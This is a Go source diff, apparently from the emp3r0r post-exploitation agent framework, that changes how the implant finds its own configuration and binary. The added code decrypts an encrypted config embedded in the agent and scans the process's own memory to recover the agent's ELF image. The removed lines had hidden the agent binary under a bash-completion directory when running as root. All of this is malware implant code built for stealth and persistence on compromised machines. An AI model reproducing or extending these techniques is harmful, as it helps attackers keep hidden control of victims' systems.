@@ -7,6 +7,7 @@ import (
 	"os"
 	"runtime"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 )
 
@@ -31,6 +32,18 @@ func ExtractData() (data []byte, err error) {
 	if len(data) <= 0 {
 		err = fmt.Errorf("No data extracted")
 	}
+
+	return
+}
+
+func VerifyConfigData(data []byte) (jsonData []byte, err error) {
+	// decrypt attached JSON file
+	jsonData, err = crypto.AES_GCM_Decrypt(emp3r0r_data.OneTimeMagicBytes, data)
+	if err != nil {
+		err = fmt.Errorf("Decrypt config JSON failed (%v), invalid config data?", err)
+		return
+	}
+
 	return
 }
 
@@ -39,18 +52,6 @@ func GetProcessExe(pid int) (exe_data []byte, err error) {
 	process_exe_file := fmt.Sprintf("/proc/%d/exe", pid)
 	if runtime.GOOS == "windows" {
 		process_exe_file = os.Args[0]
-	}
-	// see loader.c
-	// if started by loader.so, /proc/self/exe will not be agent binary
-	if os.Getenv("LD") == "true" {
-		exe_file := FileBaseName(os.Args[0])
-		process_exe_file = fmt.Sprintf("%s/_%s",
-			ProcCwd(pid),
-			exe_file)
-		if os.Geteuid() == 0 {
-			process_exe_file = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
-				exe_file)
-		}
 	}
 	exe_data, err = os.ReadFile(process_exe_file)
 
@@ -97,21 +98,15 @@ func DigEmbeddedData(data []byte, base int64) (embedded_data []byte, err error) 
 		return
 	}
 
-	// copy executable file to EXE_MEM_FILE for later use
-	mem, err := os.Open(fmt.Sprintf("/proc/%d/mem", os.Getpid()))
+	// found and verify
+	embedded_data, err = VerifyConfigData(embedded_data)
 	if err != nil {
-		err = fmt.Errorf("digging data, trying to find agent executable: cannot open /proc/%d/mem: %v", os.Getpid(), err)
+		err = fmt.Errorf("Verify config data: %v", err)
 		return
 	}
-	defer mem.Close()
-	// TODO need to determine the size of the executable
-	ReadMemoryRegion(mem.Fd(), uintptr(base), uintptr(0))
 
-	EXE_MEM_FILE = data
-	log.Printf("Saved %d bytes of executable to EXE_MEM_FILE", len(EXE_MEM_FILE))
-
-	// found
-	log.Printf("Digged %d config bytes from %d bytes of given data", len(embedded_data), len(data))
+	// confirm
+	log.Printf("Digged %d config bytes from %d bytes of given data at (0x%x)", len(embedded_data), len(data), base)
 	return
 }
 
@@ -142,4 +137,36 @@ func DigEmbededDataFromMem() (data []byte, err error) {
 // DumpSelfMem dump all mapped memory regions of current process
 func DumpSelfMem() (map[int64][]byte, error) {
 	return crossPlatformDumpSelfMem()
+}
+
+// FindEXEInMem search process memory for emp3r0r ELF
+func FindEXEInMem() (err error) {
+	mem_regions, err := DumpSelfMem()
+	if err != nil {
+		err = fmt.Errorf("cannot dump self memory: %v", err)
+		return
+	}
+
+	for base, mem_region := range mem_regions {
+		if bytes.Contains(mem_region, []byte("ELF")) && bytes.Contains(mem_region, emp3r0r_data.OneTimeMagicBytes) {
+			log.Printf("Found magic string in memory region 0x%x", base)
+			end := base + int64(len(mem_region))
+			log.Printf("Saving memory region 0x%x - 0x%x", base, end)
+			elf_data := append(mem_region, mem_regions[end]...)
+			end = base + int64(len(elf_data))
+			log.Printf("Saving memory region 0x%x - 0x%x", base, end)
+			elf_data = append(mem_region, mem_regions[end]...)
+			end = base + int64(len(elf_data))
+			log.Printf("Saving memory region 0x%x - 0x%x", base, end)
+			elf_data = append(mem_region, mem_regions[end]...)
+			log.Printf("Saved %d bytes to EXE_MEM_FILE", len(elf_data))
+			EXE_MEM_FILE = elf_data
+			break
+		}
+	}
+	if len(EXE_MEM_FILE) <= 0 {
+		return fmt.Errorf("no emp3r0r ELF found in memory")
+	}
+
+	return
 }
